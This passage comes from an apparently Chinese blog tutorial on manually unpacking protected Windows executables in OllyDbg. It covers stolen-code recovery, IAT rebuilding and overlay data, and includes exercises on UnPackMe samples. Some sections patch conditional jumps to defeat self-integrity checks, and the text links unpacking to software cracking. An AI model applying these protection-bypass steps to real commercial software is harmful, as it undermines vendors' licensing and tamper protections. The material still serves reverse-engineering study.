class="line">004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]</span><br></pre></td></tr></table></figure><p>将刚才复制的代码粘贴在它的上方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">004F27A9    55              push ebp</span><br><span class="line">004F27AA    8BEC            mov ebp,esp</span><br><span class="line">004F27AC    6A FF           push -0x1</span><br><span class="line">004F27AE    68 78E35300     push SoWorker.0053E378</span><br><span class="line">004F27B3    68 407B4F00     push SoWorker.004F7B40</span><br><span class="line">004F27B8    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">004F27BE    50              push eax</span><br><span class="line">004F27BF    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">004F27C6    83EC 58         sub esp,0x58</span><br><span class="line">004F27C9    53              push ebx</span><br><span class="line">004F27CA    56              push esi</span><br><span class="line">004F27CB    57              push edi                                 ; SoWorker.006CF040</span><br><span class="line">004F27CC    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]</span><br></pre></td></tr></table></figure><p>设置EIP指向第一条指令。脱壳。</p><h3 id="4-13-4-以壳解壳"><a href="#4-13-4-以壳解壳" class="headerlink" title="4.13.4 以壳解壳"></a>4.13.4 以壳解壳</h3><p>Stolen Code太多，可以用以壳解壳的方法。以壳解壳就是将Stolen Code及Stolen Code所在区段的壳一并放在主程序里。这样会导致比无壳程序多了很多无用代码，文件大小比无壳程序大很多。</p><p>与4.13.3操作几乎一致。由于它有ASLR，所以地址与4.13.3会有所不同。FOEP为<code>4F27CF</code>，OEP为<code>C871DE</code>。</p><p>打开LoadPE，修正镜像大小，先完整转存一个，再区域转存OEP所在的区段。在PE编辑器打开脱壳程序，区段-&gt;选中最后一个区段右键-&gt;从磁盘载入区段，将我们刚才保存的区段载入，右键-&gt;编辑区段，程序基址为400000，所在区段起始地址为C80000，所以虚拟地址应为C80000-400000=880000。保存-&gt;确定。</p><p>选项-&gt;重建-&gt;只选“使PE有效”。重建PE-&gt;载入脱壳程序。</p><p>用importREC修复IAT，OEP先填写FOEP，修复好指针后再修改OEP为真正的OEP。程序正常运行。</p><h1 id="5-疑难杂症"><a href="#5-疑难杂症" class="headerlink" title="5. 疑难杂症"></a>5. 疑难杂症</h1><h2 id="5-1-附加数据的处理方法"><a href="#5-1-附加数据的处理方法" class="headerlink" title="5.1 附加数据的处理方法"></a>5.1 附加数据的处理方法</h2><img src="/posts/e2d652c5/%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE.png" class="" title="附加数据"><p>PEID查壳是NSPacK壳，后面写着[overlay]，也就是这个程序有附加数据。</p><p>overlay真正的意思是取消打开功能，将这些需要读取的数据放到pe文件的后面，让程序自动运行打开的功能。比如mp3文件需要播放器打开，那mp3文件除了音乐数据还需要附加数据，让播放器读到能通过播放器运行。</p><p>如果单纯用NSPacK脱壳方法还不足够，会发现脱壳后的程序运行不了。正确方法是将加壳程序后面的附加数据粘贴到脱壳程序的后面。</p><p>用PEID查看区段信息，重点关注最后一个区段的R偏移和R大小。</p><img src="/posts/e2d652c5/%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE%E8%8A%82%E6%9F%A5%E7%9C%8B%E5%99%A8.jpg" class="" title="附加数据节查看器"><p>8800h+400h=8C00h</p><p>用Win HEX打开加壳程序，Alt+G搜索偏移<code>8C00</code>，选第一个字节右键-&gt;选块开始，选文件最后一个字节右键-&gt;选块结束，右键-&gt;编辑-&gt;复制选块-&gt;正常。打开脱壳后的程序，选中最后一个字节，右键-&gt;编辑-&gt;剪贴板数据-&gt;粘贴，保存。程序正常运行。</p><h2 id="5-2-自校验的去除方法"><a href="#5-2-自校验的去除方法" class="headerlink" title="5.2 自校验的去除方法"></a>5.2 自校验的去除方法</h2><p>用了以上各种方法修复程序都运行不了，可以考虑可能是程序有自校验。</p><p>自校验原理：程序会检查自己有没有被修改，如果发现被修改的话，便会离开或进行其它动作。基本的校检方法包括checksum，检查大小，检查跳转代码，等等。</p><p> 将脱壳后的程序也用OD载入，在两个OD的命令窗口下断点<code>bp CreateFileA</code>回车，Alt+F9执行到用户代码，取消断点。接下来对比两个程序执行的不同之处，主要看条件跳转指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040120C   /75 07           jnz short 例子.00401215</span><br><span class="line">0040120E   |B8 01000000     mov eax,0x1</span><br><span class="line">00401213   |EB 02           jmp short 例子.00401217</span><br><span class="line">00401215   \33C0            xor eax,eax</span><br></pre></td></tr></table></figure><p>加壳程序这个跳转不实现，而脱壳程序的这个跳转实现了。只要将脱壳程序的跳转指令修改即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnz short 例子.00401215=&gt;jz short 例子.00401215</span><br></pre></td></tr></table></figure><p>保存后程序正常运行。</p><h1 id="6-脱壳后的简单应用"><a href="#6-脱壳后的简单应用" class="headerlink" title="6. 脱壳后的简单应用"></a>6. 脱壳后的简单应用</h1><p>程序的破解、汉化、美化都要先脱壳才能进行。</p><h2 id="6-1-软件汉化及DIY"><a href="#6-1-软件汉化及DIY" class="headerlink" title="6.1 软件汉化及DIY"></a>6.1 软件汉化及DIY</h2><h3 id="6-1-1-VB类"><a href="#6-1-1-VB类" class="headerlink" title="6.1.1 VB类"></a>6.1.1 VB类</h3><p>VB程序最好用GetVBRes工具。</p><h3 id="6-1-2-VC-VS类"><a href="#6-1-2-VC-VS类" class="headerlink" title="6.1.2 VC++/VS类"></a>6.1.2 VC++/VS类</h3><p>VC++/VS程序可以用Resource Hacker、PEexplorer、xnresource工具。</p><p>脱完壳后加载进Resource Hacker，还是显示“有非标准资源”错误提示，说明我们手工脱壳没脱干净，可能在重建IAT时大小设置为1000，导致有很多垃圾指针。可以用fixres修复一下脱壳后的程序。</p><h3 id="6-1-3-BC-类-Delphi"><a href="#6-1-3-BC-类-Delphi" class="headerlink" title="6.1.3 BC++类/Delphi"></a>6.1.3 BC++类/Delphi</h3><p>BC++/Delphi类最好用PEexplorer工具。</p><h1 id="7-脱壳练习"><a href="#7-脱壳练习" class="headerlink" title="7. 脱壳练习"></a>7. 脱壳练习</h1><h2 id="7-1-kkrunchy-0-23"><a href="#7-1-kkrunchy-0-23" class="headerlink" title="7.1 kkrunchy 0.23"></a>7.1 kkrunchy 0.23</h2><p>单步到<code>push</code>后用ESP定律，继续F8往下，看到一个大跳转，却没有实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">003FFD5B   /0F84 9F190000   je UnPackMe.00401700</span><br></pre></td></tr></table></figure><p>选中右键-&gt;跟随，是一大片空代码。右键-&gt;断点-&gt;硬件执行-&gt;F9，原本空代码的地方已经出现了OEP，删除硬件断点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401700    55              push ebp                                 ; UnPackMe.003F2A08</span><br><span class="line">00401701    8BEC            mov ebp,esp</span><br><span class="line">00401703    6A FF           push -0x1</span><br><span class="line">00401705    68 00254000     push UnPackMe.00402500</span><br><span class="line">0040170A    68 86184000     push UnPackMe.00401886</span><br></pre></td></tr></table></figure><p>用单步跟踪、内存镜像法都是要在大跳转那里同样操作才可到达OEP。</p><p>脱壳。注意它的基址是<code>3F0000</code>，所以OEP的偏移地址为<code>11700</code>。</p><h2 id="7-2-AT4RE-Protector"><a href="#7-2-AT4RE-Protector" class="headerlink" title="7.2 AT4RE Protector"></a>7.2 AT4RE Protector</h2><p>PEID显示yoda’s Protector v1.02</p><p>载入OD用2次内存镜像法，在<code>.rsrc</code>资源段设置内存访问断点(A)，设置访问中断(F2)断不下来，因为会去到DLL领空，记得要取消内存断点。再在PE文件头下一行下访问中断，运行，到达以下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00407101    8A1C06          mov bl,byte ptr ds:[esi+eax]</span><br><span class="line">00407104    80EB FF         sub bl,0xFF</span><br><span class="line">00407107    881C06          mov byte ptr ds:[esi+eax],bl</span><br><span class="line">0040710A    46              inc esi</span><br><span class="line">0040710B    83FE 32         cmp esi,0x32</span><br><span class="line">0040710E  ^ 75 F1           jnz short UnPackMe.00407101</span><br><span class="line">00407110  - FFE0            jmp eax                                  ; UnPackMe.00401700</span><br></pre></td></tr></table></figure><p>单步跟到<code>jmp eax</code>去到OEP。</p><h2 id="7-3-ORiEN-v2-11-2-12"><a href="#7-3-ORiEN-v2-11-2-12" class="headerlink" title="7.3 ORiEN v2.11 - 2.12"></a>7.3 ORiEN v2.11 - 2.12</h2><p>开始用ESP定律，再单步几下就到了OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004A1AF1  - FFE0            jmp eax                                  ; UnPackMe.0045159C</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0045159C    55              push ebp</span><br><span class="line">0045159D    8BEC            mov ebp,esp</span><br><span class="line">0045159F    83C4 F0         add esp,-0x10</span><br><span class="line">004515A2    B8 BC134500     mov eax,UnPackMe.004513BC                ; UNICODE &quot;;&quot;</span><br></pre></td></tr></table></figure><p>修复时直接删除无效指针，剪切指针程序会出错。</p><h2 id="7-4-MoleBox-V2-6-5"><a href="#7-4-MoleBox-V2-6-5" class="headerlink" title="7.4 MoleBox V2.6.5"></a>7.4 MoleBox V2.6.5</h2><p>单步跟，跑飞的函数跟进去，就可跟到OEP。(ESP定律也行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0045159C    55              push ebp</span><br><span class="line">0045159D    8BEC            mov ebp,esp</span><br><span class="line">0045159F    83C4 F0         add esp,-0x10</span><br><span class="line">004515A2    B8 BC134500     mov eax,UnPackMe.004513BC                ; UNICODE &quot;;&quot;</span><br></pre></td></tr></table></figure><p>脱壳，重建输入表时，有很多无效函数，用跟踪1全部修复。</p><img src="/posts/e2d652c5/MoleBox.jpg" class="" title="MoleBox"><p>PEID显示无壳，但是程序不能运行。重新操作一次回到无效函数那里，看其中一个无效函数的RVA<code>55170</code>，在OD命令窗口输入<code>d 455170</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00455170  00477189  UnPackMe.00477189</span><br></pre></td></tr></table></figure><p>发现它是程序函数，而不是系统函数，重建表中应该全是系统函数才对。猜测它是被壳加密了。</p><p>在OD重载一下程序，再次<code>d 455170</code>，这时这个地址什么都没有。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00455170  965AB0EB</span><br></pre></td></tr></table></figure><p>右键-&gt;断点-&gt;硬件访问。Shift+F9直至这个地址出现系统函数。此时处于未加密状态。而这个函数与跟踪1修复函数的名字完全不一样，所以跟踪修复不一定正确。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00455170  7C801D53  kernel32.LoadLibraryExA</span><br></pre></td></tr></table></figure><p>现在单步跟踪观察是哪一步让它变成程序函数。执行完下面这一步时，函数改变。也就是说这一步导致IAT重建时RVA为<code>55170</code>地址的函数无效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00471682    8901            mov dword ptr ds:[ecx],eax               ; UnPackMe.00477189</span><br></pre></td></tr></table></figure><p>为了不让它改变，往上找能绕过这个指令的跳转指令，这个跳转指令称为magic jump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00471658   /74 45           je short UnPackMe.0047169F</span><br><span class="line">0047165A   |8D55 F0         lea edx,dword ptr ss:[ebp-0x10]</span><br><span class="line">0047165D   |52              push edx                                 ; UnPackMe.0047D378</span><br><span class="line">0047165E   |6A 04           push 0x4</span><br><span class="line">00471660   |6A 04           push 0x4</span><br><span class="line">00471662   |8B45 08         mov eax,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170</span><br><span class="line">00471665   |50              push eax                                 ; UnPackMe.00477189</span><br><span class="line">00471666   |FF15 40D84700   call dword ptr ds:[0x47D840]             ; kernel32.VirtualProtect</span><br><span class="line">0047166C   |85C0            test eax,eax                             ; UnPackMe.00477189</span><br><span class="line">0047166E   |75 0A           jnz short UnPackMe.0047167A</span><br><span class="line">00471670   |B9 0B0000EF     mov ecx,0xEF00000B</span><br><span class="line">00471675   |E8 9D2F0000     call UnPackMe.00474617</span><br><span class="line">0047167A   |8B4D 08         mov ecx,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170</span><br><span class="line">0047167D   |8B55 F8         mov edx,dword ptr ss:[ebp-0x8]           ; UnPackMe.0047D378</span><br><span class="line">00471680   |8B02            mov eax,dword ptr ds:[edx]               ; UnPackMe.00477189</span><br><span class="line">00471682   |8901            mov dword ptr ds:[ecx],eax               ; UnPackMe.00477189</span><br><span class="line">00471684   |8D4D F4         lea ecx,dword ptr ss:[ebp-0xC]</span><br><span class="line">00471687   |51              push ecx                                 ; UnPackMe.00455170</span><br><span class="line">00471688   |8B55 F0         mov edx,dword ptr ss:[ebp-0x10]</span><br><span class="line">0047168B   |52              push edx                                 ; UnPackMe.0047D378</span><br><span class="line">0047168C   |6A 04           push 0x4</span><br><span class="line">0047168E   |8B45 08         mov eax,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170</span><br><span class="line">00471691   |50              push eax                                 ; UnPackMe.00477189</span><br><span class="line">00471692   |FF15 40D84700   call dword ptr ds:[0x47D840]             ; kernel32.VirtualProtect</span><br><span class="line">00471698   |C745 FC 0100000&gt;mov dword ptr ss:[ebp-0x4],0x1</span><br><span class="line">0047169F   \8B45 FC         mov eax,dword ptr ss:[ebp-0x4]</span><br></pre></td></tr></table></figure><p>重载，同样操作走一次，将je指令修改为jmp指令。Ctrl+G去到OEP，下断点运行，发现信息窗口的这个地址还是系统函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00455170  7C801D53  kernel32.LoadLibraryExA</span><br></pre></td></tr></table></figure><p>重建IAT时已经所有函数都有效了。脱壳，正常运行。</p><h2 id="7-5-PESpin-1-32-Stolen-Code"><a href="#7-5-PESpin-1-32-Stolen-Code" class="headerlink" title="7.5 PESpin 1.32(Stolen Code)"></a>7.5 PESpin 1.32(Stolen Code)</h2><p>ESP定律，Shift+F9运行。单步跟踪发现破碎OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00408D09    55              push ebp</span><br><span class="line">00408D0A   /EB 01           jmp short UnPackMe.00408D0D</span><br><span class="line">00408D0C   |3D 8BECEB01     cmp eax,0x1EBEC8B</span><br><span class="line">00408D11    2F              das</span><br><span class="line">00408D12    6A FF           push -0x1</span><br><span class="line">00408D14    EB 01           jmp short UnPackMe.00408D17</span><br><span class="line">00408D16    0C 68           or al,0x68</span><br><span class="line">00408D18    8890 BF01812C   mov byte ptr ds:[eax+0x2C8101BF],dl</span><br><span class="line">00408D1E    24 88           and al,0x88</span><br><span class="line">00408D20    6B7F 01 68      imul edi,dword ptr ds:[edi+0x1],0x68</span><br><span class="line">00408D24    ed              in eax,dx</span><br><span class="line">00408D25    8824EE          mov byte ptr ds:[esi+ebp*8],ah</span><br><span class="line">00408D28    810424 998F1B12 add dword ptr ss:[esp],0x121B8F99</span><br><span class="line">00408D2F    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00408D35    EB 01           jmp short UnPackMe.00408D38</span><br><span class="line">00408D37    CE              into</span><br><span class="line">00408D38    50              push eax</span><br><span class="line">00408D39    EB 01           jmp short UnPackMe.00408D3C</span><br></pre></td></tr></table></figure><p>汇总一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">00408D09    55              push ebp</span><br><span class="line">00408D0D    8BEC            mov ebp,esp</span><br><span class="line">00408D12    6A FF           push -0x1</span><br><span class="line">00408D17    68 8890BF01     push 0x1BF9088</span><br><span class="line">;00408D1C    812C24 886B7F01 sub dword ptr ss:[esp],0x17F6B88 这个在其他OEP好像没有，去掉(因为OEP不够内存)</span><br><span class="line">00408D23    68 ED8824EE     push 0xEE2488ED</span><br><span class="line">;00408D28    810424 998F1B12 add dword ptr ss:[esp],0x121B8F99 这个在其他OEP好像没有，去掉</span><br><span class="line">00408D2F    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00408D38    50              push eax</span><br><span class="line">00408D3C    64:8925 00000000     mov dword ptr fs:[0],esp</span><br><span class="line">00408D46    83EC 68              sub esp,0x68</span><br><span class="line">00408D4C    53                   push ebx</span><br><span class="line">00408D50    56                   push esi</span><br><span class="line">00408D54    57                   push edi</span><br><span class="line">00408D58    8965 E8              mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">00408D5E    33DB                 xor ebx,ebx</span><br><span class="line">00408D63    895D FC              mov dword ptr ss:[ebp-0x4],ebx</span><br><span class="line">00408D69    6A 02                push 0x2</span><br><span class="line">00408D6E    FF15 90214000        call dword ptr ds:[0x402190]             ; msvcrt.__set_app_type</span><br><span class="line">00408D77    59                   pop ecx</span><br><span class="line">00408D7B    830D 2C314000 FF     or dword ptr ds:[0x40312C],-0x1</span><br><span class="line">00408D85    830D 30314000 FF     or dword ptr ds:[0x403130],-0x1</span><br><span class="line">00408D8F    FF15 8C214000        call dword ptr ds:[0x40218C]             ; msvcrt.__p__fmode</span><br></pre></td></tr></table></figure><p>二进制代码汇总：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF 68 88 90 BF 01 68 ED 88 24 EE 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68 53 56 57 89 65 E8 33 DB 89 5D FC 6A 02 FF 15 90 21 40 00 59 83 0D 2C 31 40 00 FF 83 0D 30 31 40 00 FF FF 15 8C 21 40 00</span><br></pre></td></tr></table></figure><p>终于到达大跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00408D98  - E9 AB89FFFF          jmp UnPackMe.00401748</span><br></pre></td></tr></table></figure><p>FOEP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00401748    8B0D 20314000        mov ecx,dword ptr ds:[0x403120]</span><br><span class="line">0040174E    8908                 mov dword ptr ds:[eax],ecx</span><br><span class="line">00401750    FF15 88214000        call dword ptr ds:[0x402188]             ; msvcrt.__p__commode</span><br></pre></td></tr></table></figure><p>二进制粘贴到FOEP上方，将<code>401700</code>作为新EIP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00401700      55                 push ebp</span><br><span class="line">00401701      8BEC               mov ebp,esp</span><br><span class="line">00401703      6A FF              push -0x1</span><br><span class="line">00401705      68 8890BF01        push 0x1BF9088</span><br><span class="line">0040170A      68 ED8824EE        push 0xEE2488ED</span><br><span class="line">0040170F      64:A1 00000000     mov eax,dword ptr fs:[0]</span><br><span class="line">00401715      50                 push eax                                 ;  msvcrt._fmode</span><br><span class="line">00401716      64:8925 00000000   mov dword ptr fs:[0],esp</span><br><span class="line">0040171D      83EC 68            sub esp,0x68</span><br><span class="line">00401720      53                 push ebx</span><br><span class="line">00401721      56                 push esi</span><br><span class="line">00401722      57                 push edi</span><br><span class="line">00401723      8965 E8            mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">00401726      33DB               xor ebx,ebx</span><br><span class="line">00401728      895D FC            mov dword ptr ss:[ebp-0x4],ebx</span><br><span class="line">0040172B      6A 02              push 0x2</span><br><span class="line">0040172D      FF15 90214000      call dword ptr ds:[0x402190]             ;  msvcrt.__set_app_type</span><br><span class="line">00401733      59                 pop ecx                                  ;  005BFFD0</span><br><span class="line">00401734      830D 2C314000 FF   or dword ptr ds:[0x40312C],-0x1</span><br><span class="line">0040173B      830D 30314000 FF   or dword ptr ds:[0x403130],-0x1</span><br><span class="line">00401742      FF15 8C214000      call dword ptr ds:[0x40218C]             ;  msvcrt.__p__fmode</span><br><span class="line">00401748   .  8B0D 20314000      mov ecx,dword ptr ds:[0x403120]</span><br></pre></td></tr></table></figure><p>重建IAT用importREC不行，但用Scylla脱壳成功，程序正常运行。</p><h2 id="7-6-eXPressor-1-3-0-VB自校验处理"><a href="#7-6-eXPressor-1-3-0-VB自校验处理" class="headerlink" title="7.6 eXPressor 1.3.0(VB自校验处理)"></a>7.6 eXPressor 1.3.0(VB自校验处理)</h2><p>单步去到大跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00407D00  |.- FFE0          jmp eax                                  ;  UnPackMe.004012A0</span><br></pre></td></tr></table></figure><p>去到OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040129A  - FF25 AC104000   jmp dword ptr ds:[&lt;&amp;msvbvm60.#ThunRTMain_100&gt;]     ; msvbvm60.ThunRTMain</span><br><span class="line">004012A0 &gt;  68 582E4000     push dumped_.00402E58</span><br><span class="line">004012A5    E8 F0FFFFFF     call &lt;jmp.&amp;msvbvm60.#ThunRTMain_100&gt;</span><br></pre></td></tr></table></figure><p>脱壳后还是运行不了，因为本来就是要考自校验的问题。</p><p>将脱壳后的程序载入OD，在命令窗口输入<code>bpx papa</code>去到调用模块。</p><p>方法一：找到目标为<code>__vbaNew2</code>，<code>__vbaNew2</code>的功能是调用程序的子窗口或子函数。根据分析(？)，它调用了退出函数。</p><p>右键-&gt;在每个调用到<code>__vbaNew2</code>上设置断点。一个一个看。往上拉紧挨的cmp与跳转指令要格外关注，F4运行到<code>cmp</code>指令后，观察跳转指令是否绕过退出函数。绕过则不管它，没绕过将跳转实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00403D2A    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx</span><br><span class="line">00403D30    75 10           jnz short dumped_.00403D42;跳转实现，不管</span><br><span class="line">00403D32    68 E0524000     push dumped_.004052E0                                     ; ASCII &quot;d窝&quot;</span><br><span class="line">00403D37    68 2C384000     push dumped_.0040382C</span><br><span class="line">00403D3C    FF15 8C104000   call dword ptr ds:[&lt;&amp;msvbvm60.#__vbaNew2_340&gt;]            ; msvbvm60.__vbaNew2</span><br><span class="line">00403D42    8B35 E0524000   mov esi,dword ptr ds:[0x4052E0]</span><br></pre></td></tr></table></figure><p>看到有两个<code>cmp</code>与<code>jnz</code>组合，先F4、F8走一下看它是怎么运行的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00403F35    66:395D E4      cmp word ptr ss:[ebp-0x1C],bx</span><br><span class="line">00403F39    75 56           jnz short dumped_.00403F91;不实现</span><br><span class="line">00403F3B    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx</span><br><span class="line">00403F41    75 10           jnz short dumped_.00403F53;实现</span><br><span class="line">00403F43    68 E0524000     push dumped_.004052E0                                     ; ASCII &quot;d窝&quot;</span><br><span class="line">00403F48    68 2C384000     push dumped_.0040382C</span><br><span class="line">00403F4D    FF15 8C104000   call dword ptr ds:[&lt;&amp;msvbvm60.#__vbaNew2_340&gt;]            ; msvbvm60.__vbaNew2</span><br></pre></td></tr></table></figure><p>如果jnz不修改，F9出现异常。如果jnz修改为jmp，F9程序正常终止。所以第一个<code>jnz</code>应该修改为<code>jmp</code>。</p><p>又来两个<code>cmp</code>与跳转指令结合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00404295    817D E4 C05D000&gt;cmp dword ptr ss:[ebp-0x1C],0x5DC0</span><br><span class="line">0040429C    7E 54           jle short dumped_.004042F2;不实现</span><br><span class="line">0040429E    391D E0524000   cmp dword ptr ds:[0x4052E0],ebx</span><br><span class="line">004042A4    75 10           jnz short dumped_.004042B6;实现</span><br><span class="line">004042A6    68 E0524000     push dumped_.004052E0                                     ; ASCII &quot;d窝&quot;</span><br><span class="line">004042AB    68 2C384000     push dumped_.0040382C</span><br><span class="line">004042B0    FF15 8C104000   call dword ptr ds:[&lt;&amp;msvbvm60.#__vbaNew2_340&gt;]            ; msvbvm60.__vbaNew2</span><br></pre></td></tr></table></figure><p>如果jnz不修改，F9出现正常终止。如果jnz修改为jmp，F9程序弹出主程序。所以<code>jle</code>应该修改为<code>jmp</code>。</p><p>因为已经可以出现主程序了，所以后面的调用可以不管它。保存两处修改，程序可以跑起来。</p><h2 id="7-7-delphi自效验的处理"><a href="#7-7-delphi自效验的处理" class="headerlink" title="7.7  delphi自效验的处理"></a>7.7  <strong>delphi自效验的处理</strong></h2><p>是FSG 2.0的壳，上面有说，不再赘述。在修复时，会发现只有3个指针，这种情况是不可能有的，所以要手动查找IAT指针。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0045273F    A1 E03F4500     mov eax,dword ptr ds:[0x453FE0]</span><br></pre></td></tr></table></figure><p>在窗口命令输入<code>d 453FE0</code>，发现全是程序函数还有ASCII码，不是我们要找的IAT指针。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00453FE0  00455BB0  UnPackMe.00455BB0</span><br><span class="line">00453FE4  00453014  UnPackMe.00453014</span><br><span class="line">00453FE8  00407138  ASCII &quot;dVE&quot;</span><br><span class="line">00453FEC  0041ADD0  ASCII &quot;dVE&quot;</span><br></pre></td></tr></table></figure><p>往下滑啊滑啊(Zzz…)，终于来到IAT，起始地址<code>45612C</code>，末尾<code>456738</code>，大小<code>456738-45612C=60C</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 